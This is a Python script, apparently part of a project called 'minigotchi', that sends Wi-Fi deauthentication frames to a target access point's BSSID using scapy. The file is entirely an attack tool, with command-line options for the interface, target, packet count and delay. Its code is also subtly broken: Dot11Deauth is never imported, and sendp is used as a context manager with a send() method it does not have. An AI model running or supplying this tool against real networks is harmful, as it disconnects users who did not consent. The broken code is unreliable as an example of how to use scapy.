# File: minigotchi/deauth_attack.py
import argparse
import logging
import os
import signal
import sys
import time

from scapy.all import Dot11, RadioTap, sendp


def _check_root():
    if os.geteuid() != 0:
        logging.critical("Root privileges required to send deauth packets.")
        sys.exit(1)


def _signal_handler(signum, frame):
    logging.info("Received signal %s, exiting cleanly.", signum)
    sys.exit(0)


def send_deauth(
    interface: str,
    bssid: str,
    count: int = 100,
    interval: float = 0.1
) -> None:
    """
    Send deauthentication packets to a target BSSID.

    :param interface: Wireless interface to use.
    :param bssid: MAC address of target AP.
    :param count: Number of deauth packets to send.
    :param interval: Delay between packets in seconds.
    """
    _check_root()
    signal.signal(signal.SIGINT, _signal_handler)
    signal.signal(signal.SIGTERM, _signal_handler)

    pkt = RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid) / Dot11Deauth()
    logging.info(
        "Starting deauth attack on %s via %s (count=%d, interval=%.2fs)",
        bssid, interface, count, interval,
    )

    with sendp(pkt, iface=interface, count=0, inter=interval, verbose=False) as sender:
        for i in range(count):
            try:
                sender.send()
            except Exception as e:
                logging.error("Failed to send packet %d: %s", i + 1, e)
                continue

    logging.info("Completed deauth attack (sent %d packets)", count)


def main():
    parser = argparse.ArgumentParser(description="Deauthentication Attack for Minigotchi")
    parser.add_argument(
        "-i", "--interface", default="wlan0", help="Wireless interface to use"
    )
    parser.add_argument("-b", "--bssid", required=True, help="Target AP BSSID (MAC)")
    parser.add_argument(
        "-c", "--count", type=int, default=100, help="Number of deauth packets to send"
    )
    parser.add_argument(
        "-d", "--delay", type=float, default=0.1, help="Delay between packets in seconds"
    )
    args = parser.parse_args()

    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s [%(levelname)s] %(message)s",
    )

    send_deauth(
        interface=args.interface,
        bssid=args.bssid,
        count=args.count,
        interval=args.delay,
    )


if __name__ == "__main__":
    main()